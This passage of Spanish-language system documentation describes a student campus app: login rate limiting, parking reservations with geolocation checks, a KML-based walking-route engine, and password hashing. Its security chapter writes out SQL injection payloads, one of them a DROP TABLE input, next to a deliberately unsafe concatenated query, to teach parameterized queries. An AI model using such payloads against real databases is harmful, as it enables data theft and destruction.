Nota: self._hash_password() internamente ejecuta bcrypt.hashpw() con una sal aleatoria, produciendo un hash seguro de 60 caracteres que se almacena en la columna password_hash.

9. A partir de ese momento, el usuario puede hacer login normalmente con boleta + contrasena.

## 5.7 RATE LIMITING DETALLADO

Para proteger contra ataques de fuerza bruta, se implemento rate limiting con flask-limiter. La fuerza bruta es un ataque donde un programa automatico intenta miles o millones de contrasenas por segundo hasta encontrar la correcta.

Analogia: El rate limiting es como un guardia de seguridad que dice "si te equivocas 5 veces seguidas, tienes que esperar 1 minuto antes de intentar de nuevo". Un ser humano normal no se equivoca 5 veces en un minuto, pero un programa automatico intentaria miles de veces por minuto.

```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(
    get_remote_address,      # Identifica al usuario por su IP
    app=app,
    storage_uri="memory://", # Almacena los contadores en memoria
)

@app.route("/auth/login", methods=["POST"])
@limiter.limit("5 per minute")   # Maximo 5 peticiones por minuto
def login():
    ...

@app.route("/auth/register", methods=["POST"])
@limiter.limit("3 per minute")   # Maximo 3 peticiones por minuto
def register():
    ...

@app.route("/auth/set-password", methods=["POST"])
@limiter.limit("3 per minute")   # Maximo 3 peticiones por minuto
def set_password():
    ...
```

Explicacion de cada parametro:
- get_remote_address: Funcion que obtiene la IP del cliente. Cada IP tiene su propio contador.
- storage_uri="memory://": Los contadores se guardan en la memoria del servidor. Si el servidor se reinicia, los contadores se resetean.
- "5 per minute": Permite maximo 5 peticiones para esa ruta por minuto por IP.

Si un atacante desde la IP 192.168.1.50 intenta 6 logins en un minuto, la sexta peticion recibira:
```
HTTP 429 Too Many Requests
{"error": "5 per 1 minute"}
```

El atacante debe esperar hasta que su ventana de un minuto se reinicie.

## 5.8 AUTENTICACION CON AZURE (PLACEHOLDER)

El frontend incluye la configuracion basica para autenticacion con Microsoft Azure Active Directory:

```javascript
export const msalConfig = {
    auth: {
        clientId: "TU_CLIENT_ID_AQUI",
        authority: "https://login.microsoftonline.com/common",
        redirectUri: "http://localhost:5173",
    },
};
```

- clientId: Identificador unico de la aplicacion registrada en Azure. Se obtiene al registrar la app en el portal de Azure.
- authority: URL del servidor de autenticacion de Microsoft. "common" permite cualquier cuenta Microsoft; en produccion se cambiaria al tenant ID del IPN.
- redirectUri: URL a la que Microsoft redirige al usuario despues de autenticarse.

Cuando se implemente completamente, el flujo sera:

1. El usuario presiona "Iniciar con Outlook" en Login.jsx.
2. MSAL abre una ventana emergente de login de Microsoft.
3. El usuario ingresa su correo @alumno.ipn.mx y contrasena de Outlook.
4. Microsoft valida las credenciales y retorna un token JWT firmado digitalmente.
5. El frontend envia el token al backend: POST /auth/check-email con el token.
6. El backend decodifica el token, verifica la firma con la clave publica de Microsoft, verifica que el dominio sea @alumno.ipn.mx.
7. Si es valido, busca o crea el alumno en la base de datos local.
8. El usuario accede al sistema sin necesidad de crear una cuenta separada.


# CAPITULO 6. SISTEMA DE ESTACIONAMIENTO

## 6.1 DESCRIPCION GENERAL

El sistema de estacionamiento permite a los alumnos consultar la disponibilidad de lugares, reservar un lugar desde su telefono y marcar cuando lo ocupan fisicamente. Esta diseñado para un estacionamiento dividido en cuatro secciones, cada una con multiples cajones individuales.

Analogia completa: El sistema funciona como una aplicacion de cine para reservar asientos. Cuando abres la app del cine, ves un mapa de la sala con los asientos en colores: verde (disponible), azul (seleccionado por ti), rojo (ocupado por alguien mas). Puedes reservar un asiento desde tu casa, pero cuando llegas al cine necesitas confirmar que te sentaste ahi. Si no llegas a tiempo, tu reserva se cancela y el asiento vuelve a estar disponible. Nuestro sistema funciona exactamente igual pero con cajones de estacionamiento en vez de asientos de cine.

## 6.2 MODELO DE DATOS DETALLADO

El sistema utiliza cuatro modelos principales que viven en map_models.py:

### ParkingSection (Seccion de estacionamiento)

Representa una region del estacionamiento. El estacionamiento de ESIME Culhuacan tiene 4 secciones:

```python
class ParkingSection(db.Model):
    __tablename__ = 'parking_sections'
    __bind_key__ = 'map'
    
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(50), nullable=False)
    total_spaces = db.Column(db.Integer, nullable=False)
    map_image_url = db.Column(db.String(255), nullable=True)
    campus_id = db.Column(db.Integer, default=1)
    spaces = db.relationship('ParkingSpace', backref='section', lazy=True)
```

Explicacion campo por campo:
- name: Nombre visible de la seccion (ejemplo: "Seccion 1", "Seccion 2").
- total_spaces: Numero total de cajones en la seccion (ejemplo: 30).
- map_image_url: URL de una imagen del mapa de la seccion (para mostrar en el frontend).
- campus_id: Identificador del campus, por si el sistema se usa en multiples campus.
- spaces: Relacion con la tabla ParkingSpace. Permite acceder a todos los espacios de una seccion con section.spaces. El parametro lazy=True significa que los espacios NO se cargan automaticamente cuando se consulta la seccion; solo se cargan cuando se accede a .spaces. Esto mejora el rendimiento.

### ParkingSpace (Espacio individual)

Representa un cajon individual. Cada seccion tiene muchos espacios:

```python
class ParkingSpace(db.Model):
    __tablename__ = 'parking_spaces'
    __bind_key__ = 'map'
    
    id = db.Column(db.Integer, primary_key=True)
    section_id = db.Column(db.Integer, db.ForeignKey('parking_sections.id'), nullable=False)
    space_number = db.Column(db.Integer, nullable=False)
    status = db.Column(db.String(20), default='available')
    space_type = db.Column(db.String(20), default='normal')
    occupied_by = db.Column(db.String(20), nullable=True)
    reserved_by = db.Column(db.String(20), nullable=True)
    reservation_time = db.Column(db.DateTime, nullable=True)
```

Explicacion detallada:
- section_id: Clave foranea que conecta el espacio con su seccion. Si section_id=1, el espacio pertenece a la Seccion 1.
- space_number: Numero del cajon dentro de la seccion (ejemplo: cajon 15 de seccion 2).
- status: Estado actual del espacio. Valores posibles: 'available' (libre), 'reserved' (reservado), 'occupied' (ocupado).
- space_type: Tipo de espacio. Valores posibles: 'normal', 'handicapped' (discapacitados), 'motorcycle' (motos).
- occupied_by: Boleta del alumno que esta fisicamente estacionado aqui. Es NULL si no hay nadie.
- reserved_by: Boleta del alumno que reservo este espacio. Es NULL si no hay reserva.
- reservation_time: Fecha y hora en que se hizo la reserva. Se usa para calcular si la reserva ha expirado.

Analogia: Cada ParkingSpace es como una casilla en un tablero de ajedrez. Tiene un numero (space_number), pertenece a una fila/seccion (section_id), puede estar vacia (available), puede tener una pieza en transito (reserved) o puede estar ocupada (occupied).

### ParkingReservation (Reserva activa)

Registra las reservas vigentes con informacion adicional:

```python
class ParkingReservation(db.Model):
    __tablename__ = 'parking_reservations'
    __bind_key__ = 'map'
    
    id = db.Column(db.Integer, primary_key=True)
    space_id = db.Column(db.Integer, db.ForeignKey('parking_spaces.id'))
    user_boleta = db.Column(db.String(20), nullable=False)
    reservation_time = db.Column(db.DateTime, default=datetime.utcnow)
    status = db.Column(db.String(20), default='active')
```

Esta tabla existe separada de ParkingSpace para mantener un historial de reservas y permitir consultas eficientes como "Cuantas reservas se hicieron hoy?"

### ParkingHistory (Historial)

Actua como bitacora de TODOS los cambios de estado:

```python
class ParkingHistory(db.Model):
    __tablename__ = 'parking_history'
    __bind_key__ = 'map'
    
    id = db.Column(db.Integer, primary_key=True)
    space_id = db.Column(db.Integer, db.ForeignKey('parking_spaces.id'))
    action = db.Column(db.String(20), nullable=False)
    user_boleta = db.Column(db.String(20), nullable=True)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
```

Cada vez que un espacio cambia de estado, se crea un registro en esta tabla. Esto permite responder preguntas como: "Cuantas veces se uso el cajon 15 esta semana?" o "Quien fue la ultima persona en estacionar en el cajon 7?"

## 6.3 ESTADOS Y TRANSICIONES

Cada espacio de estacionamiento tiene una maquina de estados con tres estados posibles:

```
    ┌──────────────┐
    │   available   │ ◄── Estado inicial. El lugar esta libre.
    └──────┬───┬───┘
           │   │
  reservar │   │ ocupar directamente
           │   │
    ┌──────▼───┘───┐
    │   reserved    │ ◄── Un usuario reservo pero no ha llegado.
    └──────┬───────┘
           │
  llegar y │ confirmar
  ocupar   │
    ┌──────▼───────┐
    │   occupied    │ ◄── Un usuario esta fisicamente estacionado.
    └──────────────┘
```

Las transiciones validas son:

1. available → reserved: El usuario reserva el lugar desde la app. Se registra reserved_by con su boleta y reservation_time con la hora actual.

2. available → occupied: El usuario llega y ocupa directamente sin reservar. Se registra occupied_by con su boleta.

3. reserved → occupied: El usuario que reservo llega y confirma que ya esta estacionado. Se mueve la info de reserved_by a occupied_by.

4. reserved → available: La reserva expira o el usuario la cancela. Se limpian reserved_by y reservation_time.

5. occupied → available: El usuario se va del estacionamiento. Se limpia occupied_by.

Las transiciones INVALIDAS son:
- occupied → reserved: No puedes "des-ocupar" para volver a reserva.
- reserved → reserved: No puedes reservar algo ya reservado.
- occupied → occupied: No puedes ocupar algo ya ocupado.

## 6.4 VALIDACION DE DISTANCIA DETALLADA

El sistema implementa dos niveles de validacion geografica con radios diferentes:

### Nivel 1: Reserva (1,500 metros)

Para reservar un lugar, el usuario debe estar a un maximo de 1.5 km del centro general del estacionamiento. Este radio amplio permite reservar mientras el alumno va camino a la escuela en transporte publico o carro:

```javascript
const PARKING_CENTER = { lat: 19.329500, lng: -99.111400 };
const MAX_RESERVATION_DISTANCE = 1500; // 1.5 km en metros

const handleReserve = (spaceId) => {
    navigator.geolocation.getCurrentPosition((pos) => {
        const userCoords = {
            lat: pos.coords.latitude,
            lng: pos.coords.longitude
        };
        const distance = haversineDistance(userCoords, PARKING_CENTER);
        
        if (distance > MAX_RESERVATION_DISTANCE) {
            showNotification(
                `Estas a ${Math.round(distance)}m del estacionamiento. ` +
                `Debes estar a menos de ${MAX_RESERVATION_DISTANCE}m para reservar.`,
                'error'
            );
            return;
        }
        // Proceder con la reserva...
    });
};
```

### Nivel 2: Ocupar (50 metros por seccion)

Para marcar un lugar como "ocupado", el usuario debe estar a un maximo de 50 metros de la seccion ESPECIFICA. Esto asegura que el usuario realmente llego a esa seccion del estacionamiento:

```javascript
const PARKING_SECTIONS_COORDS = {
    'Seccion 1': { lat: 19.329415, lng: -99.111664 },
    'Seccion 2': { lat: 19.329622, lng: -99.111354 },
    'Seccion 3': { lat: 19.329827, lng: -99.110991 },
    'Seccion 4': { lat: 19.329246, lng: -99.111603 },
};
const OCCUPY_MAX_DISTANCE = 50; // 50 metros

const handleOccupy = (spaceId, sectionName) => {
    navigator.geolocation.getCurrentPosition((pos) => {
        const userCoords = {
            lat: pos.coords.latitude,
            lng: pos.coords.longitude
        };
        const sectionCoords = PARKING_SECTIONS_COORDS[sectionName];
        const distance = haversineDistance(userCoords, sectionCoords);
        
        if (distance > OCCUPY_MAX_DISTANCE) {
            showNotification(
                `Estas a ${Math.round(distance)}m de ${sectionName}. ` +
                `Debes estar a menos de 50m para marcar como ocupado.`,
                'error'
            );
            return;
        }
        // Proceder con ocupar...
    });
};
```

### Formula Haversine en el frontend

```javascript
const haversineDistance = (coords1, coords2) => {
    const R = 6371000;  // Radio de la Tierra en metros
    const lat1 = coords1.lat * Math.PI / 180;  // Convertir grados a radianes
    const lat2 = coords2.lat * Math.PI / 180;
    const dLat = (coords2.lat - coords1.lat) * Math.PI / 180;  // Diferencia de latitud
    const dLng = (coords2.lng - coords1.lng) * Math.PI / 180;  // Diferencia de longitud
    
    // Formula de Haversine
    const a = Math.sin(dLat/2) * Math.sin(dLat/2) +
              Math.cos(lat1) * Math.cos(lat2) *
              Math.sin(dLng/2) * Math.sin(dLng/2);
    const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
    
    return R * c;  // Distancia en metros
};
```

## 6.5 RESTRICCION DE UN LUGAR POR USUARIO

El sistema garantiza que cada usuario solo pueda tener UN lugar activo (reservado u ocupado) en todo el estacionamiento. No importa en que seccion este; si ya tienes un lugar, no puedes tener otro.

Analogia: Es como una politica de biblioteca donde solo puedes tener un libro prestado a la vez. Si quieres otro libro, primero debes devolver el que tienes.

```python
def _check_user_limits(self, user_boleta, exclude_space_id=None):
    # Buscar espacios donde este usuario tenga algo activo
    spaces = ParkingSpace.query.filter(
        ParkingSpace.status.in_(['reserved', 'occupied']),
        db.or_(
            ParkingSpace.occupied_by == user_boleta,
            ParkingSpace.reserved_by == user_boleta
        )
    )
    
    # Excluir el espacio actual (para permitir cambiar estado del propio)
    if exclude_space_id:
        spaces = spaces.filter(ParkingSpace.id != exclude_space_id)
    
    count = spaces.count()
    if count > 0:
        return False, "Ya tienes un lugar activo en el estacionamiento"
    return True, None
```

Explicacion del SQL generado internamente:
```sql
SELECT COUNT(*) FROM parking_spaces
WHERE status IN ('reserved', 'occupied')
AND (occupied_by = '2025350215' OR reserved_by = '2025350215')
AND id != 5;  -- excluir el espacio actual
```

El parametro exclude_space_id es importante: si el usuario tiene el espacio 5 reservado y quiere cambiarlo a "ocupado", no queremos que el sistema le diga "ya tienes un lugar activo" cuando esta actualizando su propio lugar.

## 6.6 SERVICIO DE ESTACIONAMIENTO

ParkingService centraliza toda la logica. El metodo mas importante es update_space_status:

```python
def update_space_status(self, space_id, new_status, user_boleta):
    # Paso 1: Verificar que el espacio existe
    space = ParkingSpace.query.get(space_id)
    if not space:
        return None, "Espacio no encontrado"

    # Paso 2: Si quieren reservar u ocupar
    if new_status in ['reserved', 'occupied']:
        # Verificar que el espacio esta disponible
        if space.status != 'available' and space.reserved_by != user_boleta:
            return None, "Este espacio no esta disponible"

        # Verificar que el usuario no tenga otro lugar activo
        can_use, error = self._check_user_limits(user_boleta, exclude_space_id=space_id)
        if not can_use:
            return None, error

    # Paso 3: Si quieren liberar
    if new_status == 'available':
        # Solo el dueno puede liberar
        if space.occupied_by != user_boleta and space.reserved_by != user_boleta:
            return None, "No puedes liberar un espacio que no es tuyo"

    # Paso 4: Ejecutar el cambio
    if new_status == 'reserved':
        space.status = 'reserved'
        space.reserved_by = user_boleta
        space.reservation_time = datetime.utcnow()
    elif new_status == 'occupied':
        space.status = 'occupied'
        space.occupied_by = user_boleta
        space.reserved_by = None        # Limpiar reserva si habia
        space.reservation_time = None
    elif new_status == 'available':
        space.status = 'available'
        space.occupied_by = None
        space.reserved_by = None
        space.reservation_time = None

    # Paso 5: Registrar en historial
    history = ParkingHistory(
        space_id=space_id,
        action=new_status,
        user_boleta=user_boleta,
    )
    db.session.add(history)
    db.session.commit()

    return space.to_dict(), None
```

Este metodo ejecuta 5 validaciones antes de hacer cualquier cambio, asegurando que solo se permiten operaciones validas.


# CAPITULO 7. LOGICA DEL BACKEND

## 7.1 ARQUITECTURA DE SERVICIOS

El backend sigue el patron de servicios, que separa la logica de negocio de los endpoints HTTP. Cada servicio encapsula un dominio especifico del sistema.

Analogia: En un hospital, cada departamento tiene su especialidad. El departamento de cardiologia no opera rodillas, y traumatologia no hace estudios de sangre. De la misma forma, AuthService solo maneja autenticacion, ParkingService solo maneja estacionamiento, y RoutingService solo calcula rutas. Cada servicio es experto en su dominio.

Los cinco servicios del sistema:

AuthService (auth_service.py): Maneja registro, login, validaciones de entrada y hashing de contrasenas. Es el guardián del sistema: decide quien entra y quien no.

ParkingService (parking_service.py): Gestiona espacios, reservas, validaciones de limites y cambios de estado. Es el administrador del estacionamiento.

RoutingService (routing_service.py): Calcula rutas entre dos puntos del campus usando el grafo de caminos. Es el GPS del sistema.

ScheduleService (schedule_service.py): Consulta horarios de estudiantes y grupos. Es la agenda escolar digital.

SchoolAdapter (school_adapter.py): Adaptador para sincronizar datos entre la base de datos local y una base de datos institucional externa. Es el traductor entre el sistema local y el sistema escolar.

## 7.2 MOTOR DE ENRUTAMIENTO (KML ROUTER)

El motor de enrutamiento es el componente mas complejo del backend con aproximadamente 428 lineas de codigo. Su proposito es calcular la ruta mas corta entre dos puntos del campus caminando.

### Paso 1: Carga del archivo KML

El archivo "Camino ESIME caminable.kml" fue creado trazando los caminos peatonales del campus sobre Google Earth. Contiene lineas (llamadas LineString en el formato KML) que representan cada segmento de camino.

El constructor de KMLRouter parsea este archivo XML:

```python
def _build_graph(self):
    tree = ET.parse(self.kml_path)    # Leer el archivo XML/KML
    root = tree.getroot()              # Obtener el elemento raiz
    ns = {'kml': 'http://www.opengis.net/kml/2.2'}  # Namespace de KML
    
    # Buscar todas las lineas (caminos) en el archivo
    for placemark in root.findall('.//kml:Placemark', ns):
        linestring = placemark.find('.//kml:LineString', ns)
        if linestring is None:
            continue
            
        # Extraer las coordenadas de la linea
        coords_text = linestring.find('kml:coordinates', ns).text.strip()
        coords = []
        for point in coords_text.split():
            parts = point.split(',')
            lon = float(parts[0])   # Longitud (primer valor en KML)
            lat = float(parts[1])   # Latitud (segundo valor en KML)
            coords.append((lat, lon))
        
        # Agregar cada segmento al grafo
        for i in range(len(coords) - 1):
            dist = haversine_distance(coords[i], coords[i+1])
            self.graph.add_edge(coords[i], coords[i+1], weight=dist)
```

Explicacion paso a paso:
- ET.parse() lee el archivo KML como un arbol XML.
- findall('.//kml:Placemark', ns) busca todos los elementos Placemark en cualquier nivel del arbol.
- Cada LineString contiene una cadena de coordenadas separadas por espacios: "-99.111,19.329,0 -99.112,19.330,0 ..."
- split() divide la cadena por espacios, obteniendo cada punto.
- split(',') divide cada punto en longitud, latitud y altitud.
- IMPORTANTE: En KML el orden es longitud,latitud. En nuestro sistema interno usamos latitud,longitud. Por eso se invierte.
- Para cada par de puntos consecutivos, se calcula la distancia con Haversine y se agrega como arista al grafo.

### Paso 2: Reparacion de topologia

Los caminos dibujados a mano en Google Earth no siempre se conectan perfectamente. Un nodo puede estar a 1 metro de una arista sin estar conectado. El metodo _fix_topology detecta y repara estos casos:

```python
def _fix_topology(self, tolerance=3.0):
    """Conecta nodos que estan cerca de aristas pero no estan unidos"""
    nodes = list(self.graph.nodes)
    edges = list(self.graph.edges)
    connections_added = 0
    
    for node in nodes:
        for u, v in edges:
            # Calcular el punto mas cercano en la arista (u,v)
            projected = self._project_point_to_segment(node, u, v)
            dist = haversine_distance(node, projected)
            
            if dist < tolerance and projected != node:
                # El nodo esta a menos de 3 metros de la arista
                # pero no esta conectado. Crear conexion.
                if projected not in self.graph:
                    # Insertar el punto proyectado en la arista
                    self.graph.remove_edge(u, v)
                    d1 = haversine_distance(u, projected)
                    d2 = haversine_distance(projected, v)
                    self.graph.add_edge(u, projected, weight=d1)
                    self.graph.add_edge(projected, v, weight=d2)
                
                self.graph.add_edge(node, projected, weight=dist)
                connections_added += 1
```

Analogia: Imagina que estas conectando tuberias de agua. Dos tuberias pasan muy cerca una de la otra pero no estan conectadas. _fix_topology detecta estos casos y agrega una pieza de conexion automaticamente.

### Paso 3: Calculo de ruta

Cuando se solicita una ruta, el metodo find_route ejecuta los siguientes pasos:

```python
def find_route(self, origin_lat, origin_lon, dest_lat, dest_lon):
    origin = (origin_lat, origin_lon)
    destination = (dest_lat, dest_lon)
    
    # 1. Encontrar el nodo del grafo mas cercano al origen
    origin_node = self._find_nearest_node(origin)
    
    # 2. Encontrar el nodo del grafo mas cercano al destino
    dest_node = self._find_nearest_node(destination)
    
    # 3. Verificar que ambos nodos existen en el grafo
    if origin_node is None or dest_node is None:
        return None, "No se encontraron puntos cercanos en el mapa"
    
    # 4. Ejecutar Dijkstra para encontrar la ruta mas corta
    try:
        path = nx.shortest_path(
            self.graph,
            source=origin_node,
            target=dest_node,
            weight='weight'
        )
    except nx.NetworkXNoPath:
        return None, "No existe ruta entre los puntos seleccionados"
    
    # 5. Calcular distancia total
    distance = sum(
        self.graph[path[i]][path[i+1]]['weight']
        for i in range(len(path)-1)
    )
    
    # 6. Simplificar la ruta (eliminar puntos redundantes)
    simplified = self._simplify_route(path)
    
    # 7. Retornar resultado
    return {
        "route": [[lat, lon] for lat, lon in simplified],
        "distance_meters": round(distance, 1),
        "eta_minutes": round(distance / 83.3, 1),  # 5 km/h caminando
    }, None
```

El tiempo estimado se calcula asumiendo una velocidad promedio de caminar de 5 km/h, que equivale a 83.3 metros por minuto. Entonces si la distancia es 250 metros, el tiempo estimado seria 250 / 83.3 = 3.0 minutos.

### Algoritmo Douglas-Peucker para simplificacion

La ruta cruda puede tener cientos de puntos, muchos de los cuales son colineales (estan en linea recta). El algoritmo Douglas-Peucker elimina puntos intermedios que no aportan informacion visual:

Analogia: Si dibujas una linea recta con 100 puntos, solo necesitas el primero y el ultimo. Douglas-Peucker detecta que los 98 puntos intermedios no cambian la forma de la linea y los elimina. Solo conserva puntos donde la linea cambia de direccion.

## 7.3 SERVICIO DE HORARIOS

ScheduleService permite consultar el horario de un estudiante:

```python
class ScheduleService:
    DIAS_SEMANA = {
        0: 'Lunes', 1: 'Martes', 2: 'Miercoles',
        3: 'Jueves', 4: 'Viernes', 5: 'Sabado', 6: 'Domingo'
    }

    def get_student_schedule(self, boleta, dia=None):
        user = self.user_repo.find_by_boleta(boleta)
        if not user:
            return None, "Usuario no encontrado"
        horarios = self.schedule_repo.get_schedule_by_boleta(boleta, dia)
        return horarios, None

    def get_today_schedule(self, boleta):
        # datetime.now().weekday() retorna 0=lunes, 1=martes, etc.
        dia_actual = self.DIAS_SEMANA.get(datetime.now().weekday(), 'Lunes')
        return self.get_student_schedule(boleta, dia_actual)
```

El diccionario DIAS_SEMANA traduce el numero del dia de Python (0-6) al nombre en espanol. datetime.now().weekday() retorna un entero donde 0=lunes y 6=domingo.

## 7.4 PATRON DE REPOSITORIO DETALLADO

El patron de repositorio es un patron de diseno que abstrae las consultas a la base de datos detras de interfaces. La idea es que los servicios no sepan (ni les importe) si los datos vienen de SQLite, PostgreSQL o una API externa.

Analogia: Piensa en un cajero automatico. Tu insertas tu tarjeta y pides dinero. No te importa si el banco guarda tu dinero en una boveda, en un servidor digital o en una caja fuerte. El cajero automatico es la interfaz (repositorio); el almacenamiento real es la implementacion.

### La interfaz (contrato)

```python
class UserRepository:
    """Define QUE operaciones deben existir (no COMO implementarlas)"""
    
    def find_by_boleta(self, boleta):
        """Buscar un usuario por su boleta"""
        raise NotImplementedError
    
    def find_by_email(self, email):
        """Buscar un usuario por su email"""
        raise NotImplementedError
    
    def create(self, data):
        """Crear un nuevo usuario"""
        raise NotImplementedError
    
    def update(self, boleta, data):
        """Actualizar datos de un usuario"""
        raise NotImplementedError
```

raise NotImplementedError obliga a que cualquier clase que herede de UserRepository DEBE implementar estos metodos. Si no lo hace, Python lanzara un error.

### La implementacion para SQLite

```python
class SQLiteUserRepository(UserRepository):
    """Implementacion concreta de UserRepository usando SQLite/SQLAlchemy"""
    
    def find_by_boleta(self, boleta):
        alumno = Alumno.query.filter_by(boleta=boleta).first()
        return alumno.to_dict() if alumno else None
        # Si existe, retorna un diccionario con los datos
        # Si no existe, retorna None

    def create(self, data):
        alumno = Alumno(
            boleta=data['boleta'],
            nombre=data['nombre'],
            password_hash=data.get('password_hash'),
            email=data.get('email'),
            carrera=data.get('carrera'),
            vehiculo=data.get('vehiculo', 'ninguno'),
            id_grupo=data.get('id_grupo'),
            auth_provider=data.get('auth_provider', 'local'),
        )
        db.session.add(alumno)
        db.session.commit()
        return alumno.to_dict()
```

### La fabrica de repositorios

El archivo __init__.py de repositories/ decide que implementacion usar segun la configuracion:

```python
def create_repositories(config):
    if config.DATA_PROVIDER == 'sqlite':
        return {
            'user': SQLiteUserRepository(),
            'schedule': SQLiteScheduleRepository(),
        }
    elif config.DATA_PROVIDER == 'api':
        return {
            'user': APIUserRepository(config.API_URL),
            'schedule': APIScheduleRepository(config.API_URL),
        }
```

Si en el futuro se quiere usar PostgreSQL, solo se crea una clase PostgreSQLUserRepository y se agrega un caso en la fabrica. Los servicios no necesitan ningun cambio.

## 7.5 ENDPOINTS COMPLETOS

Tabla de todos los endpoints del sistema con metodo HTTP, URL, descripcion y ejemplo:

```
AUTENTICACION
POST   /auth/login              → Iniciar sesion
       Body: {"boleta": "2025350215", "password": "abc123"}
       Respuesta: {"id": 1, "boleta": "2025350215", "nombre": "..."}

POST   /auth/register           → Registrar nuevo usuario
       Body: {"boleta": "...", "nombre": "...", "password": "..."}
       Respuesta: {"id": 3, "boleta": "...", "nombre": "..."}

POST   /auth/set-password       → Crear contrasena (usuarios migrados)
       Body: {"boleta": "2025350215", "password": "nueva123"}

POST   /auth/check-email        → Verificar email (Azure placeholder)
POST   /auth/complete-profile   → Completar perfil despues de Azure login

MAPA Y NAVEGACION
GET    /api/buildings            → Lista de edificios del campus
       Respuesta: [{"id": 1, "nombre": "Edificio 1", ...}, ...]

GET    /api/route?origin_lat=19.329&origin_lon=-99.111&dest_lat=...
       → Calcular ruta mas corta entre dos puntos
       Respuesta: {"route": [[19.329, -99.111], ...], "distance_meters": 250, "eta_minutes": 3.0}

GET    /api/graph-info           → Estadisticas del grafo
       Respuesta: {"nodes": 431, "edges": 523}

ESTACIONAMIENTO
GET    /api/parking/sections     → Secciones con disponibilidad
       Respuesta: [{"id": 1, "name": "Seccion 1", "available": 15, "total": 30}, ...]

GET    /api/parking/sections/:id/spaces → Espacios de una seccion
       Respuesta: [{"id": 1, "space_number": 1, "status": "available"}, ...]

PUT    /api/parking/spaces/:id/status  → Cambiar estado de un espacio
       Body: {"status": "reserved", "user_boleta": "2025350215"}

HORARIOS
GET    /api/schedule/:boleta     → Horario completo del alumno
GET    /api/schedule/:boleta/today → Solo horario de hoy

USUARIO
GET    /api/user/:boleta         → Datos del alumno
PUT    /api/user/:boleta         → Actualizar datos (carrera, vehiculo)

LUGARES GUARDADOS
GET    /api/saved-places/:boleta → Lugares guardados del alumno
POST   /api/saved-places         → Guardar un lugar nuevo
DELETE /api/saved-places/:id     → Eliminar un lugar guardado
```


# CAPITULO 8. SEGURIDAD DEL SISTEMA

## 8.1 PREVENCION DE SQL INJECTION

### Que es SQL Injection

SQL Injection es una tecnica donde un atacante inserta codigo SQL malicioso en los datos de entrada para manipular la base de datos. Es considerada una de las vulnerabilidades mas peligrosas y comunes en aplicaciones web.

Analogia: Imagina que en un restaurante el mesero te pregunta tu nombre para la reservacion. Tu dices: "Juan; y tambien borra todas las reservaciones". Si el sistema del restaurante ejecuta tu instruccion literalmente, no solo te registra sino que borra todo. SQL Injection funciona de la misma manera: el atacante "inyecta" instrucciones SQL dentro de un dato normal.

### Ejemplo de ataque

Si el sistema usara consultas SQL construidas con concatenacion de strings (MAL):

```python
# INSEGURO - Nunca hacer esto
query = "SELECT * FROM alumnos WHERE boleta = '" + boleta + "'"
cursor.execute(query)
```

Un atacante podria enviar como boleta:
```
' OR 1=1 --
```

La consulta resultante seria:
```sql
SELECT * FROM alumnos WHERE boleta = '' OR 1=1 --'
```

Desglosando:
- boleta = '' → busca boleta vacia (no encuentra nada)
- OR 1=1 → PERO 1 siempre es igual a 1, asi que TODAS las filas cumplen
- -- → todo lo que sigue es un comentario SQL (ignora el ' sobrante)

Resultado: se retornan TODOS los usuarios de la base de datos.

Un ataque mas destructivo seria:
```
'; DROP TABLE alumnos; --
```

Esto ejecutaria: SELECT * FROM alumnos WHERE boleta = ''; DROP TABLE alumnos; --'
Lo que BORRARIA completamente la tabla de alumnos.

### Proteccion implementada

Todas las consultas del proyecto usan SQLAlchemy ORM con parametros enlazados:

```python
# SEGURO: SQLAlchemy parametriza automaticamente
alumno = Alumno.query.filter_by(boleta=boleta).first()
```

Internamente, SQLAlchemy genera:
```sql
SELECT * FROM alumnos WHERE boleta = ?
```

Y pasa el valor de boleta como un parametro separado, NO como parte de la cadena SQL. El motor de base de datos sabe que el parametro ? es un DATO, no una instruccion SQL. Entonces incluso si el atacante envia ' OR 1=1 --, la base de datos busca literalmente un alumno con boleta "' OR 1=1 --" (que obviamente no existe).

## 8.2 HASHING DE CONTRASENAS EN DETALLE

Las contrasenas NUNCA se almacenan en texto plano. Si un atacante obtuviera acceso a la base de datos (por ejemplo, robando el archivo school.db), no podria leer las contrasenas porque estan hasheadas.

El sistema utiliza bcrypt como algoritmo principal de hashing:

- Algoritmo de cifrado: Blowfish (cifrado simetrico adaptado para hashing)
- Factor de costo: 12 (equivale a 2^12 = 4,096 rondas internas)
- Sal: Aleatoria de 16 bytes, generada automaticamente para cada hash
- Formato de salida: Cadena de 60 caracteres que comienza con $2b$12$

### Por que bcrypt y no SHA-256 o MD5 

SHA-256 y MD5 son funciones de hash de proposito general. Fueron disenadas para ser rapidas, lo cual es ideal para verificar integridad de archivos pero desastroso para contrasenas. Un atacante con una GPU moderna puede calcular miles de millones de hashes SHA-256 por segundo.

bcrypt resuelve este problema al ser deliberadamente lento. Con factor de costo 12, cada intento de hash toma alrededor de 100 milisegundos. Para un usuario haciendo login, 100ms es imperceptible. Para un atacante intentando un millon de contrasenas, son 100,000 segundos (mas de un dia).

Comparacion practica:
- MD5: 10 mil millones de intentos por segundo en GPU → contrasena de 6 digitos crackeada en 0.001 segundos.
- SHA-256: 5 mil millones de intentos por segundo en GPU → contrasena de 6 digitos crackeada en 0.002 segundos.
- bcrypt (factor 12): 10 intentos por segundo por nucleo → contrasena de 6 digitos crackeada en ~2.5 dias.

### Estructura del hash almacenado

```
$2b$12$Rn7mGk8X9Yq2TvW5pLaN3.a1b2c3d4e5f6g7h8i9j0k1l2m3n4
```

- $2b$ → Identificador del algoritmo bcrypt (version 2b, la mas actual y compatible).
- $12$ → Factor de costo. El numero de rondas de Blowfish es 2 elevado a este numero (2^12 = 4,096).
- Rn7mGk8X9Yq2TvW5pLaN3. → Sal aleatoria (22 caracteres en base64). Unica para cada usuario.
- a1b2c3d4e5f6g7h8i9j0k1l2m3n4 → Hash resultante del proceso completo.

Todo se almacena en el mismo string de 60 caracteres para que bcrypt.checkpw pueda extraer la sal y el factor de costo y reproducir exactamente el mismo proceso.

### Migracion de algoritmos legacy

Antes de marzo de 2026, el proyecto usaba PBKDF2-SHA256 via werkzeug, con hashes como:
```
pbkdf2:sha256:1000000$WrXjhXT4Bydsy1xW$7a2f6b3c9d1e5f8a...
```

